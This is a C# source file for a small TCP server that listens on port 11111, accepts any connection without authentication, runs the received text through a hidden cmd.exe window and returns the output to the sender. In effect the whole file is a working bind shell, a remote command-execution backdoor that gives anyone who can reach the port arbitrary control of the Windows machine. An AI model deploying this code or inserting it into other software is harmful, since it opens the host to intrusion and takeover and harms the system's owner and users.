using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Server
{

    class Program
    {
        static void Main(string[] args)
        {
            ExecuteServer();
        }

        public static void ExecuteServer()
        {

            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr = ipHost.AddressList[0];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
            Socket listener = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            try
            {

                listener.Bind(localEndPoint);
                listener.Listen(10);

                while (true)
                {

                    Console.WriteLine("Waiting connection ... ");
                    Socket clientSocket = listener.Accept();
                    byte[] bytes = new Byte[1024];
                    string data = null;
                    string result = null;

                    while (true)
                    {
                        int numByte = clientSocket.Receive(bytes);
                        data += Encoding.ASCII.GetString(bytes, 0, numByte);
                        result = ExecConsole(data);
                        break;
                    }

                    Console.WriteLine("Text received -> {0} ", data);
                    byte[] message = Encoding.ASCII.GetBytes(result);
                    clientSocket.Send(message);
                    clientSocket.Shutdown(SocketShutdown.Both);
                    clientSocket.Close();
                }
            }

            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static string ExecConsole(string command)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            return cmd.StandardOutput.ReadToEnd();
        }
    }
}
